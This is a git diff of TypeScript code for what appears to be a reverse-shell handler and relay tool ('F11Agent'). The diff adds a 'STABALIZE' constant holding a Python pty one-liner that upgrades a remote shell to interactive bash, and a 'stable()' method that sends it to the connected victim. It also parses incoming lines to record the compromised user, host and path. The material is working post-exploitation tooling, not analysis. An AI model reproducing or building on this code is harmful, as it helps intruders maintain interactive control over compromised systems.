@@ -17,8 +17,11 @@ const {
   RICKROLL = 'https://www.youtube.com/watch?v=oHg5SJYRHA0'
 } = process.env;
 
+const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null`;
+
 export class F11Agent extends F11Relay implements IF11Agent {
   public listener?: boolean;
+  public active = false;
   public requireAuthorized = false;
 
   constructor(public ctl: F11Controller, public socket: TLSSocket | Socket) {
@@ -60,16 +63,50 @@ export class F11Agent extends F11Relay implements IF11Agent {
   }
 
   public data(data: any): void {
+    const body = data.toString().trim();
+    const lines = body.split(`\n`);
+
+    lines.forEach(line => {
+      if (/^#f11\|/i.test(line)) {
+        const info: { user?: string, path?: string, host?: string } = {};
+        const [_, action, content] = line.split('|');
+        content.split(';').forEach(chunk => {
+          const [key, val] = chunk.split(':');
+          info[key] = val;
+        });
+
+        if (/^sig/i.test(action)) {
+          this.signature = `${info.user}@${info.host}:${info.path}`;
+        }
+      }
+    });
+
+    if (!this.active) {
+      this.active = true;
+      this.log.success(`Active: ${this.addrLocal} <> ${this.addrRemote}`);
+
+      setTimeout(() => {
+        this.registered();
+      }, 100);
+    }
+
     if (this.listener) {
       this.log.debug(`Handling data as listener: ${data}`);
-      this.handle(data.toString().trim());
+      this.handle(body);
     } else {
-      super.data(data);
+      if (this.relay) {
+        this.relay.write(data);
+      }
 
-      if (/^ *exit *$/.test(data)) {
+      if (/^ *exit *$/.test(body)) {
+        this.active = false;
         this.end();
       }
     }
+  }
+
+  public stable(cmd?: string): void {
+    this.send(cmd || STABALIZE);
   }
 
   public handle(action: string): void {
